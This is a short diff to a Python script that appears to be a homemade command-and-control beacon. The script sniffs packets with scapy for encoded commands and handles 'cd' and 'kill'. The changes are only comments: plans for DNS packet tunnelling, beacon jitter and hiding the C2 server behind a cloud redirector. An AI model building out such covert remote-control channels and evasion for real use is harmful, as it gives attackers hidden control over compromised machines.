@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 
-# TODO Implement ICMP first cause supposedly easier... supposedly
-# TODO Later: implement DNS packet transfering with scapy, packet crafting
-# TODO Later: implement some jitter for client/beacon traffic sleeping assuming we have a sendback MAYBE
+# TODO implement DNS packet transfering with scapy, packet crafting
+# TODO Later: implement some jitter for client/beacon traffic sleeping assuming we have a sendback MAYBE / not sure how applicable it is here??
 # Look into platform as a service things (for the waaay future) for getting rnadom domains it would point to a cloud machine (university envir could be on the cloud) with firewall rules then the c2 server is behind the cloud machine
 from scapy.all import AsyncSniffer, Packet
 import subprocess
@@ -34,6 +33,7 @@ def sniffHandle(packet: Packet) -> None:
         print(decodedCommand)
 
         # checks if the user passed in the cd command
+        # regex: ^: start of line + cd + \s: whitespace + (.*): group one of anything aka a command + $: end of line
         cd_match = re.match(r"^cd\s*(.*)$", decodedCommand)
 
         if decodedCommand == "kill":
